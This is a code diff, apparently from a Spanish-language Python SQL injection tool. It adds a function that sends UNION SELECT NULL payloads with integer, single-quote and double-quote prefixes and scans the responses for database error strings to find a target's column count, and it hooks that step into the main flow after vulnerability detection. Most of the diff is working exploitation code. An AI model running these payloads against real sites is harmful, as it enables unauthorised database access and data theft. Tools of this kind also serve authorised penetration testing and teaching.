@@ -64,7 +64,54 @@ def check_for_sqli(target_url, param, extra_params=None):
     print("  No se detectó vulnerabilidad evidente (Error Based).")
     return False
 
- 
+def obtener_num_columnas(url, param_vulnerable, otros_params):
+    """
+    Fase 1 Explotación: Determinar número de columnas usando UNION SELECT.
+    Prueba diferentes tipos de inyección: entero, comilla simple y comilla doble.
+    """
+    print("[*] Calculando número de columnas...")
+    
+    # Diferentes prefijos según el tipo de inyección
+    prefijos = [
+        ("entero", "1 UNION SELECT "),
+        ("comilla simple", "1' UNION SELECT "),
+        ("comilla doble", '1" UNION SELECT ')
+    ]
+    
+    for tipo, prefijo in prefijos:
+        print(f"  [*] Probando tipo: {tipo}")
+        for i in range(1, 50):
+            # Generar un payload con i columnas
+            nulls = ",".join(["NULL"] * i)
+            payload = f"{prefijo}{nulls} -- -"
+            
+            params_actuales = otros_params.copy()
+            params_actuales[param_vulnerable] = payload
+            
+            html = realizar_peticion(url, params_actuales)
+            
+            # Si no hay error de SQL, el número de columnas es correcto
+            errores_sql = [
+                "you have an error in your sql syntax",
+                "warning: mysql",
+                "unclosed quotation mark after the character string",
+                "quoted string not properly terminated",
+                "sql syntax",
+                "mysql_fetch",
+                "mysql_num_rows",
+                "pg_query",
+                "syntax error",
+                "mysql",
+                "unclosed quotation",
+                "unknown column",
+                "the used select statements have a different number of columns"
+            ]
+            if not any(error.lower() in html.lower() for error in errores_sql):
+                print(f"[+] Número de columnas encontrado: {i} (tipo: {tipo})")
+                return i, tipo
+    
+    print("[-] No se pudo determinar el número de columnas con UNION SELECT.")
+    return None, None
 
 
 def parse_args():
@@ -132,6 +179,10 @@ def main():
 
     if check_for_sqli(target_url, vuln_param, otros_params):
         print("\n[+] La URL es vulnerable a SQL Injection.")
+
+        num_columnas, tipo_inyeccion = obtener_num_columnas(target_url, vuln_param, otros_params)
+
+
     else:
         print("\n[-] No se detectó vulnerabilidad SQLi en la URL.")
     
